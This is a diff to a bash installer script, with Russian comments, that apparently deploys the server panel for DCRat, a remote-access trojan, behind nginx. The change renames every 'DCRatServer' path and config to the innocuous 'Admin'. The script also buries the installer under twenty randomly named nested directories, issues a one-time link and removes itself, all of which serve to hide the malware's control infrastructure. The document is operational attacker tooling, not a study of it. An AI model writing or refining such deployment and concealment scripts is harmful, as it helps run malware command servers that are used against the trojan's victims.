@@ -76,10 +76,10 @@ sleep 1
 log_progress "Configuring packages"
 
 # Настройка веб-директории
-sudo mkdir -p /var/www/DCRatServer > /dev/null 2>&1
-sudo chown -R www-data:www-data /var/www/DCRatServer > /dev/null 2>&1
-sudo chmod -R 755 /var/www/DCRatServer > /dev/null 2>&1
-sudo touch /var/www/DCRatServer/index.html > /dev/null 2>&1
+sudo mkdir -p /var/www/Admin > /dev/null 2>&1
+sudo chown -R www-data:www-data /var/www/Admin > /dev/null 2>&1
+sudo chmod -R 755 /var/www/Admin > /dev/null 2>&1
+sudo touch /var/www/Admin/index.html > /dev/null 2>&1
 sleep 1
 
 # Определение домена/IP
@@ -89,13 +89,13 @@ if [ -z "$domain" ]; then
 fi
 
 # Конфигурация Nginx
-config_file="/etc/nginx/sites-available/DCRatServer"
+config_file="/etc/nginx/sites-available/Admin"
 
 if [ ! -f /etc/nginx/sites-enabled/default ]; then
     sudo tee "$config_file" > /dev/null << EOL
 server {
     listen 80 default_server;
-    root /var/www/DCRatServer;
+    root /var/www/Admin;
     index index.php index.html;
     server_name $domain;
     keepalive_timeout 70;
@@ -122,7 +122,7 @@ else
     sudo tee "$config_file" > /dev/null << EOL
 server {
     listen 80;
-    root /var/www/DCRatServer;
+    root /var/www/Admin;
     index index.php index.html;
     server_name $domain;
     keepalive_timeout 70;
@@ -217,7 +217,7 @@ generate_dir_name() {
 }
 
 # Создание вложенных директорий
-nested_path="/var/www/DCRatServer"
+nested_path="/var/www/Admin"
 for (( i=1; i<=20; i++ )); do
     dir_name=$(generate_dir_name)
     nested_path="${nested_path}/${dir_name}"
@@ -245,7 +245,7 @@ fi
 # Завершение
 elapsed_time=$(( SECONDS - start_time ))
 log "✅ Installation and configuration is successfully completed in $(printf '%02d:%02d' $((elapsed_time/60)) $((elapsed_time%60)))!"
-log "🔗 Link to the installer: http://$domain${nested_path#/var/www/DCRatServer}/install.php"
+log "🔗 Link to the installer: http://$domain${nested_path#/var/www/Admin}/install.php"
 log "❕ Link can only be used once."
 
 # Самоудаление скрипта
